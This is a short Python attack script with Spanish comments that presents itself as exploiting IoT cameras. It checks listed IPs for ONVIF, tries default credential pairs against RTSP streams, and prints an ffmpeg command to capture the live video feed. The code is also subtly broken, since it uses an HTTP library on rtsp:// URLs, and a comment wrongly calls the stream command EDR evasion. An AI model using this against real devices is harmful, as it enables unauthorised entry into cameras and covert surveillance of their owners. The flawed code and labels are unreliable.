#!/usr/bin/env python3
# Descripción: Explota vulnerabilidades en cámaras IoT 5G con conectividad ONVIF/RTSP
import requests
import socket
from urllib.parse import urljoin

# Targets comunes en redes 5G (modifica según necesidad)
TARGETS = [
    "192.168.1.108",  # Ejemplo: Hikvision 5G
    "10.0.5.200"      # Ejemplo: Dahua IoT
]

# Credenciales por defecto (lista extendida)
CREDS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("root", "system"),
    ("service", "service")
]

def check_onvif(target):
    try:
        url = f"http://{target}:8899/onvif/device_service"
        r = requests.get(url, timeout=3)
        if "ONVIF" in r.headers.get("Server", ""):
            return True
    except:
        pass
    return False

def brute_force_rtsp(target):
    for user, passw in CREDS:
        try:
            auth = requests.auth.HTTPDigestAuth(user, passw)
            url = f"rtsp://{target}:554/live/ch00_0"
            r = requests.get(url, auth=auth, timeout=2)
            if "RTSP" in r.text:
                return (user, passw)
        except:
            continue
    return None

def exploit_camera(target):
    if check_onvif(target):
        print(f"[+] {target}: Servicio ONVIF activo")
        creds = brute_force_rtsp(target)
        if creds:
            print(f"[!] {target}: Creds válidas - {creds[0]}:{creds[1]}")
            # Ejemplo de comando para evadir EDR (modifica según cámara)
            print(f"  Ejecuta: ffmpeg -i rtsp://{creds[0]}:{creds[1]}@{target}/live/ch00_0 -c copy -f mpegts -")
        else:
            print(f"[-] {target}: No se encontraron creds válidas")
    else:
        print(f"[-] {target}: ONVIF no detectado")

if __name__ == "__main__":
    for ip in TARGETS:
        exploit_camera(ip)
